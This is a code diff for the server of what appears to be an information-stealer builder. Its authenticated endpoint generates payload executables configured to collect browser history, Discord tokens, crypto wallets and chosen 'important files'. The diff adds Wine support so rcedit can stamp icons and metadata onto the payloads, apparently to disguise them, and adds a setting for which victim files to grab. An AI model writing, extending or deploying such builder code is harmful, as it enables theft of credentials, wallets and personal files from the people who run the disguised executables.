@@ -1290,11 +1290,59 @@ const getRcedit = () => {
     return rcedit;
 };
 
+// Helper function to check if Wine is available (required for rcedit on Linux)
+const checkWineAvailable = () => {
+    if (process.platform === 'win32') {
+        return true; // Not needed on Windows
+    }
+    
+    try {
+        const { execSync } = require('child_process');
+        // Check for wine64 first, then fall back to wine
+        try {
+            execSync('which wine64', { stdio: 'ignore' });
+            return true;
+        } catch (e) {
+            // If wine64 doesn't exist, check for wine and create symlink
+            try {
+                execSync('which wine', { stdio: 'ignore' });
+                // wine exists, try to create wine64 symlink if it doesn't exist
+                try {
+                    const winePath = execSync('which wine', { encoding: 'utf-8' }).trim();
+                    const wine64Path = '/usr/local/bin/wine64';
+                    if (!fs.existsSync(wine64Path)) {
+                        // Try to create symlink (requires write access, might fail)
+                        try {
+                            fs.symlinkSync(winePath, wine64Path);
+                            console.log(`Created wine64 symlink: ${wine64Path} -> ${winePath}`);
+                        } catch (symlinkError) {
+                            // Can't create symlink, but wine exists so it might still work
+                            console.log('wine found but wine64 symlink could not be created. rcedit may still work.');
+                        }
+                    }
+                    return true;
+                } catch (pathError) {
+                    return true; // wine exists, should work
+                }
+            } catch (wineError) {
+                return false;
+            }
+        }
+    } catch (e) {
+        return false;
+    }
+};
+
 // Helper function to apply icon and metadata using rcedit
 const applyIconToExe = async (exePath, iconPath, metadata = {}) => {
     const rceditModule = getRcedit();
     if (!rceditModule) {
         throw new Error('rcedit not installed. Run: npm install rcedit');
+    }
+    
+    // Check for Wine on Linux
+    if (process.platform !== 'win32' && !checkWineAvailable()) {
+        throw new Error('Wine64 is required to use rcedit on Linux. Install it with: sudo apt-get install wine64 (Ubuntu/Debian) or sudo yum install wine64 (CentOS/RHEL)');
     }
     
     // Ensure absolute paths
@@ -1431,16 +1479,18 @@ app.post('/api/payloads/generate', authenticateToken, (req, res) => {
             const username = req.user.username;
             
             // Parse features from form data (sent as JSON string)
-            let features, user, outputName;
+            let features, user, outputName, importantFilesConfig;
             try {
                 features = req.body.features ? JSON.parse(req.body.features) : null;
                 user = req.body.user;
                 outputName = req.body.outputName;
+                importantFilesConfig = req.body.importantFilesConfig ? JSON.parse(req.body.importantFilesConfig) : null;
             } catch (parseErr) {
                 // Fallback for JSON body (backwards compatibility)
                 features = req.body.features;
                 user = req.body.user;
                 outputName = req.body.outputName;
+                importantFilesConfig = req.body.importantFilesConfig;
             }
             
             // Parse file metadata from form
@@ -1542,6 +1592,23 @@ app.post('/api/payloads/generate', authenticateToken, (req, res) => {
                     console.error('Failed to apply icon/metadata:', editError);
                     console.error('Error message:', editError.message);
                     console.error('Error stack:', editError.stack);
+                    
+                    // Provide helpful error message if Wine is missing
+                    if (editError.message && editError.message.includes('wine64')) {
+                        console.error('');
+                        console.error('═══════════════════════════════════════════════════════════');
+                        console.error('WINE64 NOT FOUND - Icon/metadata embedding requires Wine');
+                        console.error('═══════════════════════════════════════════════════════════');
+                        console.error('To fix this, install Wine64 on your Linux server:');
+                        console.error('  Ubuntu/Debian: sudo apt-get update && sudo apt-get install wine64');
+                        console.error('  CentOS/RHEL:   sudo yum install wine64');
+                        console.error('  Fedora:        sudo dnf install wine64');
+                        console.error('');
+                        console.error('After installing Wine, restart your server.');
+                        console.error('═══════════════════════════════════════════════════════════');
+                        console.error('');
+                    }
+                    
                     // Continue without icon/metadata on error, but log it clearly
                     console.warn('Continuing with unmodified executable due to rcedit error');
                     exeBuffer = fs.readFileSync(payloadPath);
@@ -1575,7 +1642,8 @@ app.post('/api/payloads/generate', authenticateToken, (req, res) => {
                 collectBrowserHistory: features.browserHistory || false,
                 collectDiscordTokens: features.discordTokens || false,
                 collectCryptoWallets: features.cryptoWallets || false,
-                collectImportantFiles: features.importantFiles || false
+                collectImportantFiles: features.importantFiles || false,
+                importantFilesConfig: importantFilesConfig || null
             });
 
             // Create buffer with marker + config
